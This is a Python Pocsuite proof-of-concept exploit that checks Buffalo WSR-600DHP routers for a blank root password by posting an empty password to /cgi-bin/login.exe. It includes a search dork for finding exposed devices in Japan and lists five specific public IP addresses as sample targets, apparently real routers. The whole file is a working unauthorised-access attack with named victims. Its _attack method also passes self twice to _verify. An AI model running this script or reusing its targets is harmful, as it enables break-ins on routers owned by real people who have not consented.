#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "Buffalo blank passwd"
    vulID = ''
    author = ['sebao']
    vulType = 'Auth Bypass'
    version = '1.0'  # default version: 1.0
    references = ''
    desc = ''


    vulDate = ''
    createDate = '2017-12-22'
    updateDate = '2017-12-22'

    appName = 'Buffalo'
    appVersion = ''
    dork="Buffalo Technology Routers WSR-600DHP +country:'JP' +port:'1900'"
    appPowerLink = 'http://buffalo.jp'
    samples = ['http://117.74.15.156:1900',
                'http://117.58.145.42:1900',
                'http://221.255.33.242:1900',
                'http://221.133.85.130:1900',
                'http://117.109.27.203:1900']

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url + '/cgi-bin/login.exe'
        data = "user=root&pws="
        resp = req.post(url,data=data)
        print resp.content
        if resp.status_code == 200 and "logout" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
